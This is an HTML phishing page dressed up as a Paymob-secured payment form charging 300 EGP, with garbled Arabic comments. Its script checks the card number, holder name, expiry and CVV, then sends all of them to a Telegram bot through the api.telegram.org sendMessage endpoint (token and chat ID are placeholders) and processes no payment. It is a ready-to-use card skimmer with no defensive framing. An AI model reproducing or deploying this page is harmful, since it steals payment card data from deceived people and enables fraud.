<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Information</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            background-color: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            width: 360px;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .card-image {
            width: 100%;
            border-radius: 12px;
            margin-bottom: 15px;
        }

        h2 {
            font-size: 18px;
            margin-bottom: 10px;
            color: #333;
        }

        /* ØªÙˆØ³ÙŠØ· Ø§Ù„Ø­Ù‚ÙˆÙ„ ÙÙŠ Ø§Ù„ØµÙØ­Ø© */
        .input-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        input {
            width: 100%;
            padding: 12px;
            margin: 6px 0;
            border: 1px solid #ccc;
            border-radius: 10px;
            font-size: 14px;
            text-align: center;
            transition: border 0.3s;
        }

        input:focus {
            outline: 2px solid #007bff;
        }

        .input-row {
            display: flex;
            justify-content: space-between;
        }

        .input-row input {
            width: 47%;
            border-radius: 10px;
        }

        .expiry {
            margin-right: 6px;
        }

        .save-card {
            display: flex;
            align-items: center;
            margin: 12px 0;
            font-size: 14px;
        }

        .save-card input {
            width: auto;
            margin-right: 8px;
        }

        .pay-button {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
        }

        .pay-button:hover {
            background: #0056b3;
        }

        .secured {
            font-size: 12px;
            color: #777;
            margin-top: 10px;
        }

        /* Ù„ÙˆÙ† Ø£Ø­Ù…Ø± Ø¹Ù†Ø¯ Ø§Ù„Ø®Ø·Ø£ */
        .error {
            border: 2px solid red !important;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Payment Information</h2>
        <img src="1.jpg" class="card-image" alt="Credit Card">
        
        <form id="paymentForm" class="input-container">
            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
            <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
            
            <div class="input-row">
                <input type="text" id="expiryDate" class="expiry" placeholder="MM/YY" maxlength="5" required>
                <input type="text" id="cvv" placeholder="CVV" maxlength="3" pattern="\d*" required>
            </div>

            <div class="save-card">
                <input type="checkbox" id="saveCard">
                <label for="saveCard">Save Card</label>
            </div>

            <button type="submit" class="pay-button">PAY 300.00 EGP</button>
        </form>

        <img src="2.jpg" class="card-image" alt="Paymob Secured">
        <p class="secured">ğŸ”’ Secured by Paymob</p>
    </div>

    <script>
        // ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø®Ø§ØµØ© Ø¨Ø§Ù„Ø¨ÙˆØª
        const BOT_TOKEN = "YOUR_BOT_TOKEN";  
        const CHAT_ID = "YOUR_CHAT_ID";      

        // ØªÙ†Ø³ÙŠÙ‚ Ø±Ù‚Ù… Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©: Ø¥Ø¶Ø§ÙØ© Ù…Ø³Ø§ÙØ© ÙƒÙ„ 4 Ø£Ø±Ù‚Ø§Ù…
        document.getElementById("cardNumber").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
            event.target.value = formattedValue;
        });

        // Ø¥Ø¶Ø§ÙØ© "/" Ø¨Ø¹Ø¯ Ø£ÙˆÙ„ Ø±Ù‚Ù…ÙŠÙ† ÙÙŠ ØªØ§Ø±ÙŠØ® Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ (MM/YY)
        document.getElementById("expiryDate").addEventListener("input", function(event) {
            let value = event.target.value.replace(/\D/g, ''); // Ø¥Ø²Ø§Ù„Ø© ØºÙŠØ± Ø§Ù„Ø£Ø±Ù‚Ø§Ù…
            
            // Ø¥Ø¶Ø§ÙØ© "/" Ø¨Ø¹Ø¯ Ø£ÙˆÙ„ Ø±Ù‚Ù…ÙŠÙ† ÙÙ‚Ø·
            if (value.length >= 2 && !value.includes("/")) {
                value = value.substring(0, 2) + "/" + value.substring(2);
            }

            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ù‚ÙŠÙ… ÙÙŠ MM Ùˆ YY
            let [mm, yy] = value.split("/");

            // ØªÙ„ÙˆÙŠÙ† Ø§Ù„Ø­Ù‚Ù„ Ø¨Ø§Ù„Ù„ÙˆÙ† Ø§Ù„Ø£Ø­Ù…Ø± Ø¥Ø°Ø§ ÙƒØ§Ù† MM Ø£ÙƒØ¨Ø± Ù…Ù† 12 Ø£Ùˆ YY Ø£ÙƒØ¨Ø± Ù…Ù† 33
            if (parseInt(mm) > 12 || parseInt(yy) > 33) {
                event.target.classList.add("error");
            } else {
                event.target.classList.remove("error");
            }

            event.target.value = value; // Ø§Ù„Ø³Ù…Ø§Ø­ Ù„Ù„Ø¹Ù…ÙŠÙ„ Ø¨ÙƒØªØ§Ø¨Ø© Ø£ÙŠ Ø´ÙŠØ¡ Ù…Ø¹ Ø¥Ø¶Ø§ÙØ© "/"
        });

        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const cardNumber = document.getElementById("cardNumber");
            const cardHolder = document.getElementById("cardHolder");
            const expiryDate = document.getElementById("expiryDate");
            const cvv = document.getElementById("cvv");
            const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";

            let valid = true;

            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø¥Ø¯Ø®Ø§Ù„Ø§Øª ÙˆØªÙ„ÙˆÙŠÙ† Ø§Ù„Ø­Ù‚ÙˆÙ„ Ø¨Ø§Ù„Ø£Ø­Ù…Ø± Ø¹Ù†Ø¯ Ø§Ù„Ø®Ø·Ø£
            if (cardNumber.value.replace(/\s/g, '').length !== 16) {
                cardNumber.classList.add("error");
                valid = false;
            } else {
                cardNumber.classList.remove("error");
            }

            if (!/^[A-Za-z ]+$/.test(cardHolder.value)) {
                cardHolder.classList.add("error");
                valid = false;
            } else {
                cardHolder.classList.remove("error");
            }

            if (!expiryDate.value || expiryDate.value.length < 4) {
                expiryDate.classList.add("error");
                valid = false;
            } else {
                expiryDate.classList.remove("error");
            }

            if (!/^\d{3}$/.test(cvv.value)) {
                cvv.classList.add("error");
                valid = false;
            } else {
                cvv.classList.remove("error");
            }

            if (!valid) return;

            const message = `ğŸ‘¤ Name: ${cardHolder.value}\nğŸ’³ Card: ${cardNumber.value}\nğŸ“… Expiry: ${expiryDate.value}\nğŸ”’ CVV: ${cvv.value}\nğŸ’¾ Save: ${saveCard}`;

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
            .then(() => window.open("page.html", "_blank"));
        });
    </script>

</body>
</html>
